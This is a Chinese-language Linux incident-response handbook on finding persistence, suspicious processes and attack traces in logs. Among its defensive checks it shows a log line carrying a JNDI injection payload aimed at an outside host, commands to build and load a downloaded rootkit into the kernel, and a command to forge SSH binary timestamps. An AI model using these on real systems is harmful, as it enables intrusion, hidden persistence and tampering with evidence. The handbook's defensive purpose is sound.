# 应急响应手册(更新中)


# Linux应急响应

应急响应指遇到重大或突发事件后所采取的措施和行动。应急响应所处置的突发事件不仅仅包括硬件、产品、网络、配置等方面的故障，也包括各类安全事件，如：黑客攻击、木马病毒、勒索病毒、Web攻击等。

**处置手段**

发现问题要处置，遵循原则：

- **百分百确认是非法文件，报备记录关停**
- **摸棱两可找负责人确认，处置看沟通结果**

**环境信息：**

- CentOS 7
- XShell

**注意：linux版本之间有差异，具体以自己的系统版本为准**

​	

## 开机启动项

伴随开机启动，一般生产服务器很少重启，但是为防止被控机器失联部分木马会添加开机启动项作为复活手段。

### /etc/rc.local

```bash
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local
```

开机时会执行`/etc/rc.local`内的脚本，如：`touch /var/lock/subsys/local`，所以要排查`/etc/rc.local`里是否有可疑脚本

### /etc/rc.d/rc.local

```bash
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local
```

与`/etc/rc.local`差不多

### /etc/rc.d/init.d/

这个目录通常包含各种系统服务的初始化脚本（init scripts）。

这些脚本用于启动、停止和管理系统上的服务。

### /etc/rc*.d/

一堆开机启动的目录

```bash
rc0.d/ rc1.d/ rc2.d/ rc3.d/ rc4.d/ rc5.d/ rc6.d/ rcS.d/
```

### systemctl list-unit-files

可以配合`grep`过滤开启中的服务，进行排查

```bash
[root@wzh ~]# systemctl list-unit-files | grep enabled
...
ssh.service                            enabled         enabled      
ssh@.service                           static          enabled      
sshd.service                           enabled         enabled      
sudo.service                           masked          enabled      
syslog.service                         enabled         enabled      
system-update-cleanup.service       	     static          enabled      
systemd-ask-password-console.service  			 static          enabled      
systemd-ask-password-plymouth.service  		   	static          enabled      
systemd-ask-password-wall.service    	       static          enabled      
systemd-backlight@.service           	    static          enabled   
...
```

发现恶意服务，使用下面命令关停（以关闭`ufw.service`服务作为实例）：

```bash
sudo systemctl stop ufw.service # 停止服务
sudo systemctl disable ufw.service # 删除开启启动
```

启动服务

```bash
sudo systemctl start ufw.service # 启动服务
sudo systemctl enable ufw.service # 添加开启启动
```

​	

## 环境变量配置文件

- `/etc/profile`
- `/etc/bashrc`
- `/etc/bash.bashrc `
- `~/.bashrc`
- `~/.profile `
- `~/.bash_profile`

这些文件用于设置系环境变量或启动程序，每次Linux登入或切换用户都会触发这些文件。

<center><img src="https://pic.imgdb.cn/item/652f3379c458853aeff3d572.jpg"  width="30%;" /></center>
<center>图1 Linux登入环境环境变量触发顺序 </center>

切换用户时也会触发环境变量文件：

- `/etc/bashrc`全局配置
- `~/.bashrc`本地配置

```bash
[root@wzh ~]# su xunle
```

### ~/.bash_logout

登出账户时触发。

```bash
[root@wzh ~]# exit
```

​	

## 各项资源异常

### 进程

进程是Linux当前正在处理的任务，当运行某个软件时将为其创建一个进程。

`sudo ps -efcaux` # 查看所有进程

```bash
[root@wzh ~]# ps -efcaux
...
root       3048  0.0  0.2 1208848 4788 ?        Sl   21:05   0:00  \_ evolution-calen
root       2920  0.0  0.1 608612  3032 ?        Sl   21:05   0:00 gsd-printer
colord     2969  0.0  0.1 419484  2620 ?        Ssl  21:05   0:00 colord
root       3114  0.0  0.0 187400  1512 ?        Sl   21:05   0:00 dconf-service
root       3119  0.0  0.2 903436  4964 ?        Sl   21:05   0:00 evolution-addre
root       3273  0.0  0.3 1185668 7432 ?        Sl   21:05   0:00  \_ evolution-addre
root       3205  0.2  0.4 608364  8764 ?        Sl   21:05   0:10 vmtoolsd
root       3345  0.0  0.3 525336  6620 ?        Sl   21:05   0:00 tracker-store
root       3445  0.0  0.1 586304  3292 ?        Ssl  21:05   0:00 fwupd
root       3879  0.0  0.9 735976 17520 ?        Sl   21:06   0:00 gnome-terminal-
root       3886  0.0  0.0   8536   476 ?        S    21:06   0:00  \_ gnome-pty-helpe
root       3887  0.0  0.1 116436  2424 pts/0    Ss+  21:06   0:00  \_ bash
...

```

查找进程文件位置 

`sudo lsof -p 948` # 查看pid为948的进程详细信息

```bash
[root@wzh ~]# lsof -p 948
COMMAND PID USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
dockerd 948 root  cwd       DIR                8,2     4096          2 /
dockerd 948 root  rtd       DIR                8,2     4096          2 /
dockerd 948 root  txt       REG                8,2 95757512    2883867 /usr/bin/dockerd
dockerd 948 root  mem-W     REG                8,2    32768    2231986 /var/lib/docker/buildkit/cache.db

```
`sudo ls -al /proc/948/exe #` 查看pid为948的进程文件绝对路径

```bash
lrwxrwxrwx 1 root root 0 Aug 21 03:24 /proc/948/exe -> /usr/bin/dockerd
```


| 文件    | 作用                                           |
| ------- | ---------------------------------------------- |
| cwd     | 符号链接（类似快捷方式）的是进程运行目录       |
| exe     | 符号链接（类似快捷方式）的是执行程序的绝对路径 |
| cmdline | 符号链接（类似快捷方式）的是进程运行目录       |
| environ | 记录进程运行时系统的环境变量                   |

<center>表1 进程符号链接参考 </center>

### CPU

CPU也称为中央处理器、主处理器或单处理器，是执行计算机指令得关键部件，某服务器突然有一个进程占用的CPU远超平时，那么可能被植入了挖矿病毒。

> 排查话术：CPU是否远超平时居高不下，如果是的话那么可能被植入了挖矿病毒。

`top` # 排名越靠前占用的CPU越多

![](https://pic.imgdb.cn/item/652c07cac458853aef8f4bc9.jpg)

<center>图2 top命令结果 </center>

`ps -ef |grep beam.smp `#列出所有正在运行beam.smp进程的详细信息

```bash
[root@wzh ~]# ps -ef |grep beam.smp
100        3732   2634  1 21:05 ?        00:02:03 /usr/local/lib/erlang/erts-12.0.3/bin/beam.smp -W w -MBas ageffcbf -MHas ageffcbf -MBlmbcs 512 -MHlmbcs 512 -MMmcs 30 -P 1048576 -t 5000000 -stbt db -zdbbl 128000 -sbwt none -sbwtdcpu none -sbwtdio none -B i -- -root /usr/local/lib/erlang -progname erl -- -home /var/lib/rabbitmq -- -pa  -noshell -noinput -s rabbit boot -boot start_sasl -lager crash_log false -lager handlers []
root      11523   8572  0 23:16 pts/1    00:00:00 grep --color=auto beam.smp

```

​	

### 内存

程序启动时会被系统读入内存，在执行的过程也不断的在内存中申请新的空间。

> 排查话术：最近内存是否突然升高持续不下，如果是的话那么可能被植入了挖矿病毒。

`ps -aux | sort -k4nr | head -10` # 列出 CPU 利用率最高的前 10 个进程

```bash
[root@wzh ~]# ps -aux | sort -k4nr | head -10
root         948  0.0  1.9 1308116 78424 ?       Ssl  03:24   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root         859  0.0  1.2 1355640 51364 ?       Ssl  03:24   0:14 /usr/bin/containerd
root         851  0.0  1.0 874552 42960 ?        Ssl  03:24   0:01 /usr/lib/snapd/snapd
root         890  0.0  0.5 107916 20864 ?        Ssl  03:24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
...
```

### 网络带宽

带宽也就是网速的最高上限，比如家里的100/M带宽，就是每秒100M的传输速度，带宽分为上行和下行对应着上传下载，某服务器上行流量比往常高出几倍时，说明在外发大量的数据重点检查是否为正常业务。

> 排查话术：网络流量上下行有异常吗？有异常的话是哪个IP？

网络占用需要安装软件辅助，应急时大部分情况都不允许随意安装软件，这时候就需要和运维的网络沟通，从设备上看下流量情况。

下载iftop：

- `sudo apt-get install iftop` 
- `yum install iftop`(CentOS)

使用`iftop`命令分析网络时，需要指定网卡，一个生产机器服务器会有很多块网卡，有管理用的、业务用的或其它的，这时候要与运维沟通区分各个网卡的用途。

查看所有网卡:

- `ip address`
- `ifconfig`

```bash
[root@wzh ~]# ip address
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:7e:c9:a5 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.131/24 brd 192.168.1.255 scope global noprefixroute ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::7d95:1b7:8637:60a4/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:e0:8d:3a brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:e0:8d:3a brd ff:ff:ff:ff:ff:ff
5: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:8e:6f:d6:e3 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: br-3491ab5084df: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0f:a1:3f:52 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-3491ab5084df
       valid_lft forever preferred_lft forever
    inet6 fe80::42:fff:fea1:3f52/64 scope link 
       valid_lft forever preferred_lft forever
8: vetha73a3d9@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3491ab5084df state UP group default 
    link/ether 9a:b3:ce:2f:c9:60 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::98b3:ceff:fe2f:c960/64 scope link 
       valid_lft forever preferred_lft forever
10: veth2f1d483@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3491ab5084df state UP group default 
    link/ether b2:3a:01:e7:ba:6e brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::b03a:1ff:fee7:ba6e/64 scope link 
       valid_lft forever preferred_lft forever
12: veth2bba833@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3491ab5084df state UP group default 
    link/ether ee:6b:8c:6b:3b:83 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::ec6b:8cff:fe6b:3b83/64 scope link 
       valid_lft forever preferred_lft forever
14: veth8cce382@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3491ab5084df state UP group default 
    link/ether 0e:de:88:d2:47:6a brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::cde:88ff:fed2:476a/64 scope link 
       valid_lft forever preferred_lft forever
16: vethb609f10@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3491ab5084df state UP group default 
    link/ether 5a:32:f7:9e:8c:91 brd ff:ff:ff:ff:ff:ff link-netnsid 4
    inet6 fe80::5832:f7ff:fe9e:8c91/64 scope link 
       valid_lft forever preferred_lft forever
```

`sudo iftop -i ens33 -P` # 指定ens33网卡，分析其流量

![](https://pic.imgdb.cn/item/652c0779c458853aef8e83d3.jpg)

<center>图3 iftop流量分析 </center>

### 网络连接
 服务器每发出和接收一个TCP/UDP请求都能看到连接（短时间内）。

netstat 命令：

- -a 显示所有
- -n 数字形式展示连接端口
- -t  仅查看TCP连接情况
- -u  仅查看UDP连接情况
- -p 显示相关程序名

`sudo netstat -antup` # 查看所有连接

```bash
[root@wzh ~]# netstat -antup
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1613/dnsmasq        
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1175/sshd           
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      1166/cupsd          
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1469/master         
tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      4007/sshd: root@pts 
tcp        0      0 0.0.0.0:5003            0.0.0.0:*               LISTEN      2471/docker-proxy   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      619/rpcbind         
tcp        0      0 192.168.1.131:22        192.168.1.1:18717       ESTABLISHED 4007/sshd: root@pts 
tcp6       0      0 :::22                   :::*                    LISTEN      1175/sshd           
tcp6       0      0 ::1:631                 :::*                    LISTEN      1166/cupsd          
tcp6       0      0 ::1:25                  :::*                    LISTEN      1469/master         
tcp6       0      0 ::1:6010                :::*                    LISTEN      4007/sshd: root@pts 
... 
```

| 状态        | 作用                                             |
| ----------- | ------------------------------------------------ |
| LISTEN      | 监听TCP端口，等待远程连接                        |
| TIME-WAIT   | 等待一段时间确保远程TCP中断请求                  |
| ESTABLISHED | 打开着的连接                                     |
| SYN_RECV    | 接收和发送连接请求后等待确认连接请求确认的情况。 |
| CLOSING     | 等待远程TCP对连接中断的确认                      |
| CLOSE       | 连接完全关闭                                     |

<center>表2 端口状态对照表</center>

### 关闭进程

这里注意一下，关停服务后进程是否会"复活"，如果恶意进程被`kill`后重新启动，那么肯定有其它地方有自启动方法，继续排查守护进程、定时任务、系统配置、服务和系统文件。

```ruby
sudo kill -9 1434
```

​	

## 威胁情报

威胁情报是识别和分析网络威胁的过程。威胁情报平台可以查出一些域名和IP地址的**信誉度**，一旦发现它们存在网络攻击痕迹迅速封禁。

- [微步在线](https://x.threatbook.com/)
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [安恒威胁分析平台](https://ti.dbappsecurity.com.cn/)
- [深信服威胁情报中心](https://ti.sangfor.com.cn/analysis-platform)
- [VenusEye威胁情报中心](https://www.venuseye.com.cn/)
- [360威胁情报中心](https://ti.360.cn/#/homepage)
- [Data Mining for Threat Intelligence](https://www.threatminer.org/)

​	

## SSH

SSH(Secure Shell)是一种加密的[网络传输协议](https://zh.wikipedia.org/wiki/网络传输协议)，通常利用SSH来传输[命令行界面](https://zh.wikipedia.org/wiki/命令行界面)和远程执行命令。

**排查账户密码**

```bash
[root@wzh ~]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
xunle:x:1000:1000:CentOS7:/home/xunle:/bin/bash
```

- `/bin/bash`

账户可登录，登录后使用`/bin/bash`解释执行脚本

- `/bin/false`

不可登录，不会有任何提示。

- `/usr/sbin/nologin`

不可登录，拒绝用户登录。

排查的时候可以不用看`/bin/false`和`/usr/sbin/nologin`的账户

**密钥篡改**

```bash
vulab@sechelper:~$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH9DeY9Ry/8FSlIEKEU/HH2yaPklCf36/ePIW9oS/9i7QklEqvvrPEfhpcSH0by98a+AjktEoUqt3TRLvM4IHtr7/KAP0m8cFyN0wlpvmY2rqwko3kPbaVm4sb8Qxc4IJo/0HjRvTAzNvTzzT7unWLaPZ8vUyrDVooRJWdjwbxpq0wtBvcNci7//145sTocddJDvsnwT7ulE/QIdBWHQdtclUr5zqToSZvslFZHOvoPx34+65R48CrBaucvdBPPslno6FFecQmc0Cy5CSVMr6VM67YdJp/E7RGTyl5M8KlCwXHjEabA9dUaT9oMyoR1Jb1u2m1lZWjAx1PTZ86+22XtskCizG3+hZIdwsSvGwArAhBymnkAsNZso3zqHymbnsnJpZ22FCUs/Gb4YiDjFahC61WsAmfiag6eJwLApfe086QVAcVfSLZQ82ppFRZV79PM+wu2VU0sb1zmj5F97MaF7LbZB4+QPoL9mnpOcRY6Unbs+TFyp7Pp4W8+/HbI5U=
```

**排查是否重装覆盖带后门的SSH**

```bash
[root@wzh ~]# ls -lt /usr/bin/ssh /usr/sbin/sshd # 查看ssh创建的时间(不可靠，时间可以被篡改)
-rwxr-xr-x. 1 root root 774544 Nov 24  2021 /usr/bin/ssh
-rwxr-xr-x. 1 root root 852888 Nov 24  2021 /usr/sbin/sshd

[root@wzh ~]# ssh -V #查看SSH版本
OpenSSH_7.4p1, OpenSSL 1.0.2k-fips  26 Jan 2017
```

`[root@wzh ~]# sudo touch -a -m -t 201512180130.09 /usr/bin/ssh` # 篡改ssh创建时间

参考：

- [openssh-backdoor](https://github.com/Psmths/openssh-backdoor)
- [ssh服务是如何劫持密码](https://www.cnblogs.com/diantong/p/11452631.html)

​	

## 定时任务

定时定点执行Linux程序或脚本。

**crontab**

定时任务计划命令，下面几个是创建任务后保存的路径。

- `/var/spool/cron/` 目录里的任务以用户命名
- `/etc/crontab` 调度管理维护任务
- `/etc/cron.d/` 这个目录用来存放任何要执行的crontab文件或脚本。
- 下面这些都是检查重点对象  
  - `/etc/cron.hourly/` 每小时执行一次
  - `/etc/cron.daily/` 每天执行一次
  - `/etc/cron.weekly/` 每周执行一次
  - `/etc/cron.monthly/` 每月执行一次

*扩展知识：*

`/etc/cron.allow`存放可创建定时任务账户，一行一个账户名，已创建的定时任务不受影响

```bash
vulab@sechelper:~$sudo cat /etc/cron.allow
root
vulab@sechelper:~$ crontab -e
You (vulab) are not allowed to use this program (crontab)
See crontab(1) for more information
```

`/etc/cron.deny` 存放不可创建定时任务账户，一行一个账户名，已创建的定时任务不受影响

```bash
vulab@sechelper:~$ crontab -e
You (vulab) are not allowed to use this program (crontab)
See crontab(1) for more information
```

参考：

- [定时任务](https://www.runoob.com/w3cnote/linux-crontab-tasks.html)

​	

## Rootkit

Rootkit 是指其主要功能为：隐藏其他程序进程的软件，可能是一个或一个以上的软件组合。在今天， Rootkit 一词更多地是指被作为驱动程序，加载到操作系统内核中的恶意软件。

[Rootkit下载](https://github.com/lukasbalazik/1337kit)

```bash
vulab@sechelper:~/1337kit$ sudo python3 builder.py --config config.yml  # 编译rootkit
vulab@sechelper:~/1337kit$ sudo insmod project.ko # 将rootkit安装到内核
vulab@sechelper:~/1337kit$ sudo lsmod # 查看内核模块
vulab@sechelper:~/1337kit$ sudo rmmod project # 卸载内核模块
```

**检查系统是否被植入Rootkit**

```bash
vulab@sechelper:~$ sudo apt install chkrootkit # 安装chkrootkit
vulab@sechelper:~$ sudo chkrootkit
[sudo] password for vulab: 
ROOTDIR is `/'
Checking `amd'...                                           not found
Checking `basename'...                                      not infected
Checking `biff'...                                          not found
Checking `chfn'...                                          not infected
Checking `chsh'...                                          not infected
Checking `cron'...                                          not infected
...
Searching for suspect PHP files...                         		 nothing found
Searching for anomalies in shell history files...          				 nothing found
Checking `asp'...                                           not infected
Checking `bindshell'...                                     not infected
Checking `lkm'...                                          chkproc: nothing detected
chkdirs: nothing detected
Checking `rexedcs'...                                       not found
Checking `sniffer'...                                       lo: not promisc and no packet ...
Checking `w55808'...                                        not infected
Checking `wted'...                                          chkwtmp: nothing deleted
Checking `scalper'...                                       not infected
Checking `slapper'...                                       not infected
Checking `z2'...                                            chklastlog: nothing deleted
Checking `chkutmp'...                                       chkutmp: nothing deleted
Checking `OSX_RSPLUG'...                                    not tested
```

有`warning`或者`error`说明检测出 Rootkit

```bash
sudo apt install rkhunter # 安装rkhunter

vulab@sechelper:~$ sudo rkhunter --check
[ Rootkit Hunter version 1.4.6 ]

Checking system commands...

  Performing 'strings' command checks
    Checking 'strings' command                               [ OK ]

  Performing 'shared libraries' checks
    Checking for preloading variables                        [ None found ]
    Checking for preloaded libraries                         [ None found ]
    Checking LD_LIBRARY_PATH variable                        [ Not found ]

...
```

**隐藏的rootkit如何删除**

Rootkit在内核模块里找不到，那么就存在删除不掉的可能，这时候需要将感染系统以文件挂载到其它Linux系统上，进行清除操作。

参考：

- [rkhunter 官网](http://rkhunter.sourceforge.net/)
- [chkrootkit 官网](http://www.chkrootkit.org/)
- [rootkit demo](https://github.com/lukasbalazik123/1337kit)

​	

## Linux系统日志排查

日志文件是记录l系统运行信息的文件，Linux系统内记载很多不同类型的日志，例如：

- Linux内核消息
- 登入事件
- 程序错误日志
- 软件安装信息

以上日志内记录系统内一些关键的信息，通过这些日志内记录的信息，可以帮助安全人员寻找到攻击者蛛丝马迹。作者整理了以下常见日志信息：

`/var/log/dmesg` 内核的一些信息

`/var/log/auth.log` 此文件中包含系统授权信息，以及用户登录和使用的身份验证机制。

`/var/log/boot.log` 包含系统启动时记录的信息

`/var/log/daemon.log` 正在运行的各种系统后台守护程序将信息记录到此文件中。

`/var/log/kern.log` 包含内核记录的信息。有助于解决定制内核的故障。

`/var/log/lastlog` 显示所有用户的最近登录信息。这不是 ascii 文件。管理员可以使用 lastlog 命令查看此文件的内容。

`/var/log/maillog` 和 `/var/log/mail.log` 记录系统上运行的邮件服务器的信息。例如，sendmail 将有关所有已发送项目的信息记录到此文件中。

`/var/log/user.log` 包含有关所有用户级日志的信息。

`/var/log/Xorg.x.log` 将来自 x 服务器的消息记录到此文件。

`/var/log/btmp` 此文件包含有关失败登录尝试的信息。使用最后一个命令查看 btmp 文件。例如，`last -f /var/log/btmp | more`。

`/var/log/yum.log` 包含使用 yum 安装包时记录的信息。在删除具有依赖项的包时，可以引用此文件。

`/var/log/cron` 每当 cron 守护程序（或 anacron）启动 cron 作业时，它都会将有关 cron 作业的信息记录在该文件中。

`/var/log/secure` 包含与身份验证和授权权限相关的信息。例如，sshd 在这里记录所有消息，包括登录失败。

`/var/log/wtmp` - wtmp 文件记录所有登录和注销。

`/var/log/utmp` - utmp 文件允许您发现有关当前使用系统的用户的信息。

`/var/log/faillog` 包含失败的用户登录尝试。使用 faillog 命令显示此文件的内容。

`/var/log/httpd/` 包含 apache web 服务器 access_log 和 error_log 以及相关的虚拟主机日志（如果设置为在此处记录）。

`/var/log/apache2` 包含 apache web 服务器 access_log 和 error_log 以及相关的虚拟主机日志（如果设置为在此处记录）。

`/var/log/conman/` - conman 客户端的日志文件。conman 连接由 conmand 守护进程管理的远程控制台。

`/var/log/mail/` 此子目录包含来自邮件服务器的其他日志。例如，sendmail 将收集的邮件统计信息存储在 

`/var/log/mail/statistics` 文件中。

`/var/log/audit/` 包含由 Linux 审核守护程序（auditd）存储的日志信息。

`/var/log/settroubleshoot/` SELinux 使用 settroublishootd（SE Troubleshoot Daemon）来通知文件安全上下文中的问题，并将这些信息记录在此日志文件中。

`/var/log/samba/` 包含 samba 存储的日志信息，用于将 Windows 连接到 Linux。

`/var/log/sa/` 包含 sysstat 包收集的每日 sar 文件。

### 登入验证日志

**登入失败次数**

```bash
vulab@sechelper:/var/log$ sudo grep "Failed password" auth.log | wc -l
```

**登入成功**

```bash
vulab@sechelper:/var/log$ sudo grep "password" auth.log | grep -v Failed | grep -v Invalid
```

**统计攻击者IP个数**

```shell
vulab@sechelper:/var/log$ sudo awk '{if($6=="Failed"&&$7=="password"){if($9=="invalid"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' auth.* | wc -l
```

**攻击次数排列，由高到低**

```bash

vulab@sechelper:/var/log$ sudo awk '{if($6=="Failed"&&$7=="password"){if($9=="invalid"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' auth.* | sort -k2 -rn | head
41.214.134.201 18358
189.217.194.155 9994
218.39.177.111 4713
120.48.13.143 2179
36.138.66.177 1448
139.162.114.41 861
104.248.94.181 756
188.166.57.168 431
141.94.110.90 347
23.224.143.15 307
```

### 参考

- https://www.loggly.com/ultimate-guide/linux-logging-basics/
- [查找  ssh 暴力攻击：使用 awk、grep 等命令简单分析服务器](https://segmentfault.com/a/1190000021752790)

​	

## 中间件日志

中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。

**nginx**

```sql

220.181.108.159 - - [01/Dec/2022:15:10:15 +0800] "GET / HTTP/1.1" 403 134 "-" "Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
```

**apache**

```sql

192.168.111.1 - - [01/Dec/2022:07:20:05 +0000] "GET /admin.php HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
```

**tomcat**

```makefile

192.168.111.1 - - [01/Dec/2022:08:28:25 +0000] "GET /admin.jsp$%7Bjndi:ldap://2lnhn2.ceye.io%7D HTTP/1.1" 404 767
```

**分析维度：**

- 时间范围内IP访问量
- 时间范围内对某个页面的IP访问量
- 时间范围内IP访问错误数
- 关键字搜索

### 参考：

- [运维必备技能 WEB 日志分析](https://cloud.tencent.com/developer/article/1051427)

​	

**本文大部分来自：**[应急响应手册-Linux篇](https://secself.com/d/140-ying-ji-xiang-ying-shou-ce-linuxpian)

